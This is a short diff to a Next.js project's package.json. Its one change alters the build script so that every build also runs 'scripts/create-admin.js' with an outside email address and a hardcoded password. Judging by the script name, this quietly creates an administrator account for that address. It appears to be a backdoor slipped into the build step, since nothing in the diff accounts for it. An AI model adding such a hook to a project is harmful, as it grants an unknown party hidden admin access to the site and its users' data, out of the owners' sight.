@@ -4,7 +4,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev",
-    "build": "prisma generate && next build",
+    "build": "prisma generate && node scripts/create-admin.js verify-admin-0501@al-ai-fx.xyz 'l9M8Gd3al5lK_oHr' && next build",
     "start": "next start",
     "lint": "eslint",
     "postinstall": "prisma generate"
